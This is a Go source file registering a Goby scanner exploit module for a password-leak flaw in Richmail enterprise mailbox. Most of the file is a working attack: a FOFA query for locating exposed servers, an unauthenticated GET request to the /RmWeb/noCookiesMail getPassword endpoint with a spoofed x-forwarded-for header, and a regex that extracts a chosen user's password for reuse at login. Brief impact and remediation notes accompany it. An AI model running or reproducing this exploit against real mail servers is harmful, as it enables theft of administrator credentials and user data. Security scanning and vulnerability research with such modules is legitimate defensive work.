package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Richmail /RmWeb/NoCookiesMai User Password Leak",
    "Description": "<p>Richmail-Enterprise Mailbox is a customized mailbox service that provides more features and customization to meet the needs of enterprise users. Attackers use this vulnerability to obtain passwords of administrator users and steal user information and sensitive files</p>",
    "Product": "Richmail-enterprise-mailbox",
    "Homepage": "http://richmail.richinfo.cn/",
    "DisclosureDate": "2023-10-10",
    "PostTime": "2024-03-14",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "body=\"homesetTitleAndCopy\" && body=\"webmail\" && body=\"gMain\"",
    "GobyQuery": "body=\"homesetTitleAndCopy\" && body=\"webmail\" && body=\"gMain\"",
    "Level": "3",
    "Impact": "<p>Attackers use this vulnerability to obtain passwords of administrator users and steal user information and sensitive files</p>",
    "Recommendation": "<p>1.Restrict ip login</p><p>2.Upgrade new version</p><p>3.Restriction of interface privileges</p>",
    "References": [
        "https://blog.csdn.net/MDSEC/article/details/134121871"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "custom",
            "show": ""
        },
        {
            "name": "userName",
            "type": "input",
            "value": "admin",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/RmWeb/noCookiesMail?func=user:getPassword&userMailName=admin",
                "follow_redirect": true,
                "header": {
                    "Cache-Control": "max-age=0",
                    "Content-Type": "Application/X-www-Form",
                    "x-forwarded-for": "127.0.0.1"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "S_OK",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/RmWeb/noCookiesMail?func=user:getPassword&userMailName=admin"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/RmWeb/noCookiesMail?func=user:getPassword&userMailName={{{userName}}}",
                "follow_redirect": false,
                "header": {
                    "Cache-Control": "max-age=0",
                    "Content-Type": "Application/X-www-Form",
                    "x-forwarded-for": "127.0.0.1"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "S_OK",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "password|lastbody|regex|(?:\"errorMsg\":\")([\\s\\S]*)(?:\")",
                "output|lastbody|variable|username:admin,password:{{{password}}}{{{CRLF}}}登录时使用该值替换password字段"
            ]
        }
    ],
    "Tags": [
        "Unauthorized Access",
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure",
        "Unauthorized Access"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.2",
    "Translation": {
        "CN": {
            "Name": "企业邮箱 /RmWeb/NoCookiesMail 用户密码泄露漏洞",
            "Product": "Richmail-企业邮箱",
            "Description": "<p>Richmail-企业邮箱是一种专为企业用户定制的邮箱服务，提供了更多的功能和定制化的服务，以满足企业用户的需求。攻击者使用该漏洞获取管理员用户的密码，窃取用户信息和敏感文件<br></p>",
            "Recommendation": "<p>1.限制ip登陆</p><p>2.升级新版本</p><p>3.限制接口权限</p>",
            "Impact": "<p>攻击者使用该漏洞获取管理员用户的密码，窃取用户信息和敏感文件<br></p>",
            "VulType": [
                "未授权访问",
                "信息泄露"
            ],
            "Tags": [
                "未授权访问",
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Richmail /RmWeb/NoCookiesMai User Password Leak",
            "Product": "Richmail-enterprise-mailbox",
            "Description": "<p>Richmail-Enterprise Mailbox is a customized mailbox service that provides more features and customization to meet the needs of enterprise users. Attackers use this vulnerability to obtain passwords of administrator users and steal user information and sensitive files<br></p>",
            "Recommendation": "<p>1.Restrict ip login</p><p><span style=\"color: var(--primaryFont-color);\">2.Upgrade new version</span></p><p>3.Restriction of interface privileges</p>",
            "Impact": "<p>Attackers use this vulnerability to obtain passwords of administrator users and steal user information and sensitive files<br></p>",
            "VulType": [
                "Information Disclosure",
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access",
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10934"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
